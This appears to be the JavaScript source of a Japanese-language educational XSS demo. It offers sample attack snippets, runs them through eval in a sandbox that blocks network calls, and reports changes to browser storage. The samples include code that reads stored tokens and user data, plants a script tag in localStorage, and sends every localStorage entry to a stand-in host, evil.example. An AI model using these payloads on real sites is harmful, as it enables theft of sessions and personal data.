class XSSDemo {
  constructor() {
    this.xssInput = document.getElementById("xssInput");
    this.xssResult = document.getElementById("xssResult");
    // 表示する文言は辞書から取る。ここにはコードと識別子だけを置く。
    this.attackCategories = {
      basic: {
        scripts: [
          { id: "token", code: 'localStorage.getItem("token")' },
          { id: "session", code: 'sessionStorage.getItem("user_data")' }
        ]
      },
      advanced: {
        scripts: [
          { id: "enumerate", code: 'Object.keys(localStorage).map(k => `${k}: ${localStorage.getItem(k)}`).join("\\n")' },
          { id: "json", code: "JSON.stringify(localStorage)" }
        ]
      },
      persistent: {
        scripts: [
          { id: "malware", code: 'localStorage.setItem("malware", "<script>alert(\\"Persistent XSS!\\")</script>")' },
          { id: "exfiltrate", code: 'for(let i=0; i<localStorage.length; i++) { const key = localStorage.key(i); fetch(`https://evil.example/steal?${key}=${localStorage.getItem(key)}`); }' }
        ]
      }
    };
  }

  t(key, params) {
    return window.i18n.t(key, params);
  }

  el(tag, props = {}, children = []) {
    const node = document.createElement(tag);
    for (const [name, value] of Object.entries(props)) {
      if (name === "class") node.className = value;
      else if (name === "text") node.textContent = value;
      else if (value !== null && value !== undefined) node.setAttribute(name, value);
    }
    for (const child of [].concat(children)) {
      if (child) node.append(child);
    }
    return node;
  }

  init() {
    this.addExampleButtons();
    this.addWarning();
  }

  addWarning() {
    const warningElement = this.el("div", { class: "xss-warning" }, [
      this.el("strong", { text: this.t("xss.warningLabel") }),
      document.createTextNode(" " + this.t("xss.warningBody"))
    ]);

    const xssSection = document.getElementById("xss");
    const firstChild = xssSection.querySelector("p");
    if (firstChild) {
      firstChild.after(warningElement);
    }
  }

  addExampleButtons() {
    const exampleContainer = this.el("div", { class: "xss-examples" }, [
      this.el("h3", { text: this.t("xss.scenarioHeading") })
    ]);

    Object.entries(this.attackCategories).forEach(([categoryId, category]) => {
      const categorySection = this.el("div", { class: "attack-category" }, [
        this.el("div", { class: "category-header" }, [
          this.el("h4", { text: this.t(`xss.category.${categoryId}.name`) }),
          this.el("p", { class: "category-description", text: this.t(`xss.category.${categoryId}.description`) })
        ])
      ]);

      const scriptsContainer = this.el("div", { class: "attack-scripts" });

      category.scripts.forEach((script) => {
        const button = this.el("button", {
          class: "select-script-btn",
          type: "button",
          text: this.t("xss.select")
        });
        button.addEventListener("click", () => {
          this.xssInput.value = script.code;
          this.showScriptExplanation(categoryId, script);
        });

        scriptsContainer.appendChild(this.el("div", { class: "attack-script-card" }, [
          this.el("div", { class: "script-info" }, [
            this.el("strong", { text: this.t(`xss.script.${script.id}.name`) }),
            this.el("span", { class: "script-explanation", text: this.t(`xss.script.${script.id}.explanation`) })
          ]),
          button
        ]));
      });

      categorySection.appendChild(scriptsContainer);
      exampleContainer.appendChild(categorySection);
    });

    this.xssInput.parentNode.insertBefore(exampleContainer, this.xssInput);
  }

  showScriptExplanation(categoryId, script) {
    const existing = document.querySelector(".script-explanation-active");
    if (existing) existing.remove();

    // コードはtextContentで入れる。
    // 以前はHTML文字列へ差し込んでいたため、<script>を含む例でタグとして解釈されていた。
    const explanationDiv = this.el("div", { class: "script-explanation-active" }, [
      this.el("div", { class: "explanation-content" }, [
        this.el("h4", { text: this.t("xss.selectedAttack", { name: this.t(`xss.script.${script.id}.name`) }) }),
        this.el("p", {}, [
          this.el("strong", { text: this.t("xss.behaviorLabel") }),
          document.createTextNode(" " + this.t(`xss.script.${script.id}.explanation`))
        ]),
        this.el("p", {}, [this.el("strong", { text: this.t("xss.codeLabel") })]),
        this.el("code", { text: script.code }),
        this.el("div", { class: "risk-indicator" }, [
          this.el("span", { class: "risk-level", text: this.t("xss.riskLevel") }),
          this.el("span", { text: this.t("xss.riskNote") })
        ])
      ])
    ]);

    this.xssInput.parentNode.insertBefore(explanationDiv, this.xssInput.nextSibling);
  }

  runXSS() {
    const input = this.xssInput.value.trim();
    
    if (!input) {
      this.showResult(this.t("xss.result.needInput"), "info");
      return;
    }

    this.clearResult();
    this.ensureDemoData(input);
    this.showExecutionSteps(input);
    
    let restoreSandbox = () => {};

    try {

      const originalAlert = window.alert;
      const originalFetch = window.fetch;
      const originalXMLHttpRequest = window.XMLHttpRequest;
      const originalWebSocket = window.WebSocket;
      const originalImage = window.Image;
      const originalSendBeacon = navigator.sendBeacon;
      let alertContent = null;
      let fetchAttempts = [];
      let blockedRequests = [];

      // thisのコンテキストを保存
      const self = this;

      // 差し替えるより先に復元手順を決めておく。
      // 途中で例外が出ても、必ずこの関数で元へ戻せるようにする。
      restoreSandbox = () => {
        window.alert = originalAlert;
        window.fetch = originalFetch;
        window.XMLHttpRequest = originalXMLHttpRequest;
        window.WebSocket = originalWebSocket;
        window.Image = originalImage;
        navigator.sendBeacon = originalSendBeacon;
      };


      window.alert = (msg) => {
        alertContent = msg;
        self.logSecurityEvent("ALERT_CALLED", { message: msg });
      };

      window.fetch = (url, options) => {
        fetchAttempts.push({ url, options });
        self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { url, options });
        // 拒否したPromiseをそのまま返すと、デモのスクリプトが受け取らない場合に
        // 「未処理のPromise拒否」としてコンソールへ出る。
        // 同じPromiseへ空のcatchを付けて、処理済みとして扱う。
        const rejected = Promise.reject(new Error(self.t("xss.blocked.request")));
        rejected.catch(() => {});
        return rejected;
      };

      // XMLHttpRequestをブロック
      window.XMLHttpRequest = class {
        open() {
          blockedRequests.push({ type: 'XMLHttpRequest', args: arguments });
        }
        send() {
          self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'XMLHttpRequest' });
        }
        setRequestHeader() {}
      };

      // WebSocketをブロック
      window.WebSocket = class {
        constructor(url) {
          blockedRequests.push({ type: 'WebSocket', url });
          self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'WebSocket', url });
          throw new Error(this.t("xss.blocked.websocket"));
        }
      };

      // Imageの外部URLをブロック
      window.Image = class extends originalImage {
        set src(value) {
          if (value && (value.startsWith('http://') || value.startsWith('https://') || value.startsWith('//'))) {
            blockedRequests.push({ type: 'Image', src: value });
            self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'Image', src: value });
            // 外部URLはブロック（何もしない）
          } else {
            // 相対URLやdata:URIは許可
            super.src = value;
          }
        }
        get src() { return super.src; }
      };

      // navigator.sendBeaconをブロック
      navigator.sendBeacon = (url, data) => {
        blockedRequests.push({ type: 'sendBeacon', url, data });
        self.logSecurityEvent("EXTERNAL_REQUEST_BLOCKED", { type: 'sendBeacon', url });
        return false;
      };

      const beforeStorage = this.captureStorageSnapshot();
      const result = eval(input);
      const afterStorage = this.captureStorageSnapshot();

      // すべてのオーバーライドを元に戻す
      restoreSandbox();

      // 全ての試行をカウント
      const totalBlockedRequests = fetchAttempts.length + blockedRequests.length;
      this.analyzeSecurityImpact(beforeStorage, afterStorage, totalBlockedRequests);
      
      if (alertContent !== null) {
        this.showResult(this.t("xss.result.alert", { content: alertContent }), "alert");
      } else {
        // 外部送信攻撃の場合（fetch使用を優先判定）
        if (input.includes('fetch(') && (input.includes('localStorage') || input.includes('sessionStorage'))) {
          this.showResult(this.t("xss.result.blocked"), "alert");
        }
        // setItem系の攻撃の場合
        else if (input.includes('localStorage.setItem') || input.includes('sessionStorage.setItem')) {
          this.showResult(this.t("xss.result.written"), "success");
        }
        // 通常の結果表示
        else if (result !== undefined) {
          this.showResult(this.t("xss.result.value", { value: this.formatResult(result) }), "success");
        } else {
          this.showResult(this.t("xss.result.empty"), "info");
        }
      }
      
    } catch (e) {
      restoreSandbox();
      this.showResult(this.t("xss.result.error", { message: e.message }), "error");
    }
  }

  showExecutionSteps(script) {
    const steps = ["validated", "sandbox", "snapshot"].map((name) =>
      this.el("li", { class: "step-item", text: this.t(`xss.step.${name}`) })
    );
    const running = this.el("li", { class: "step-item active", text: this.t("xss.step.running") });

    const stepsDiv = this.el("div", { class: "execution-steps" }, [
      this.el("h4", { text: this.t("xss.stepsHeading") }),
      this.el("ol", { class: "steps-list" }, [...steps, running])
    ]);

    this.xssResult.parentNode.insertBefore(stepsDiv, this.xssResult);

    setTimeout(() => {
      const lastStep = stepsDiv.querySelector(".step-item.active");
      if (lastStep) {
        lastStep.textContent = this.t("xss.step.done");
        lastStep.classList.remove("active");
      }
    }, 500);
  }

  captureStorageSnapshot() {
    const snapshot = {
      localStorage: {},
      sessionStorage: {},
      count: {
        local: localStorage.length,
        session: sessionStorage.length
      }
    };
    
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      snapshot.localStorage[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      snapshot.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    return snapshot;
  }

  analyzeSecurityImpact(before, after, totalBlockedRequests) {
    const changes = {
      localStorage: this.compareStorageObjects(before.localStorage, after.localStorage),
      sessionStorage: this.compareStorageObjects(before.sessionStorage, after.sessionStorage),
      externalRequests: totalBlockedRequests
    };

    this.displaySecurityAnalysis(changes);
  }

  compareStorageObjects(before, after) {
    const changes = { added: [], modified: [], removed: [] };
    
    Object.keys(after).forEach(key => {
      if (!before[key]) {
        changes.added.push(key);
      } else if (before[key] !== after[key]) {
        changes.modified.push(key);
      }
    });
    
    Object.keys(before).forEach(key => {
      if (!after[key]) {
        changes.removed.push(key);
      }
    });
    
    return changes;
  }

  displaySecurityAnalysis(changes) {
    const hasChanges = changes.localStorage.added.length ||
                      changes.localStorage.modified.length ||
                      changes.localStorage.removed.length ||
                      changes.sessionStorage.added.length ||
                      changes.sessionStorage.modified.length ||
                      changes.sessionStorage.removed.length ||
                      changes.externalRequests > 0;

    if (!hasChanges) return;

    const analysisDiv = this.el("div", { class: "security-analysis" }, [
      this.el("h4", { text: this.t("xss.analysisHeading") }),
      this.buildAnalysisReport(changes)
    ]);

    this.xssResult.parentNode.insertBefore(analysisDiv, this.xssResult);
  }

  // キーはHTML文字列へ差し込まず、textContentで入れる。
  // 引用符を含むキーでも表示が壊れない。
  buildChangeList(changes) {
    const list = this.el("ul");
    const rows = [
      ["added", "change-added", "xss.change.added"],
      ["modified", "change-modified", "xss.change.modified"],
      ["removed", "change-removed", "xss.change.removed"]
    ];
    for (const [field, className, labelKey] of rows) {
      for (const key of changes[field]) {
        list.appendChild(this.el("li", { class: className, text: this.t(labelKey, { key }) }));
      }
    }
    return list;
  }

  buildAnalysisReport(changes) {
    const report = this.el("div", { class: "analysis-report" });

    for (const [area, headingKey] of [["localStorage", "xss.impact.local"], ["sessionStorage", "xss.impact.session"]]) {
      const target = changes[area];
      if (!(target.added.length || target.modified.length || target.removed.length)) continue;
      report.appendChild(this.el("div", { class: "storage-changes" }, [
        this.el("h5", { text: this.t(headingKey) }),
        this.buildChangeList(target)
      ]));
    }

    if (changes.externalRequests > 0) {
      report.appendChild(this.el("div", { class: "security-threat" }, [
        this.el("h5", { text: this.t("xss.threatHeading") }),
        this.el("p", { class: "threat-blocked", text: this.t("xss.threatBlocked", { count: changes.externalRequests }) }),
        this.el("p", { class: "threat-warning", text: this.t("xss.threatWarning") })
      ]));
    }

    return report;
  }

  logSecurityEvent(type, data) {
    console.warn(`[security event] ${type}`, data);
  }

  ensureDemoData(script) {
    // 基本的な攻撃デモ用のサンプルデータを自動で準備
    if (script.includes('localStorage.getItem("token")') && !localStorage.getItem("token")) {
      localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo_user_token");
      this.showDataPreparationNotice("token");
    }
    
    if (script.includes('sessionStorage.getItem("user_data")') && !sessionStorage.getItem("user_data")) {
      sessionStorage.setItem("user_data", JSON.stringify({
        userId: 12345,
        username: "demo_user",
        email: "demo@example.com",
        role: "user"
      }));
      this.showDataPreparationNotice("user_data");
    }
    
    // 全データ取得系の攻撃の場合、複数のサンプルデータを準備
    if ((script.includes('Object.keys(localStorage)') || script.includes('JSON.stringify(localStorage)')) 
        && localStorage.length === 0) {
      localStorage.setItem("token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo_jwt_token");
      localStorage.setItem("user_id", "12345");
      localStorage.setItem("preferences", JSON.stringify({theme: "dark", lang: "ja"}));
      this.showDataPreparationNotice("multiple items");
    }
  }

  showDataPreparationNotice(dataType) {
    const notice = this.el("div", { class: "data-preparation-notice" }, [
      this.el("div", { class: "notice-content" }, [
        this.el("span", { class: "notice-icon", text: "📋" }),
        this.el("span", { class: "notice-text", text: this.t("xss.demoDataAdded", { name: dataType }) })
      ])
    ]);

    this.xssResult.parentNode.insertBefore(notice, this.xssResult);

    // 3秒後に自動で削除
    setTimeout(() => {
      notice.remove();
    }, 3000);
  }

  formatResult(result) {
    if (result === null) return "null";
    if (result === undefined) return "undefined";
    if (typeof result === "object") {
      try {
        return JSON.stringify(result, null, 2);
      } catch {
        return String(result);
      }
    }
    return String(result);
  }

  showResult(message, type) {
    this.xssResult.className = `xss-output xss-${type}`;
    this.xssResult.textContent = message;
    this.xssResult.style.display = "block";
  }

  clearResult() {
    this.xssResult.style.display = "none";
    this.xssResult.textContent = "";
    
    const stepsDiv = document.querySelector('.execution-steps');
    if (stepsDiv) stepsDiv.remove();
    
    const analysisDiv = document.querySelector('.security-analysis');
    if (analysisDiv) analysisDiv.remove();
    
    const explanationDiv = document.querySelector('.script-explanation-active');
    if (explanationDiv) explanationDiv.remove();
    
  }

}

window.XSSDemo = XSSDemo;
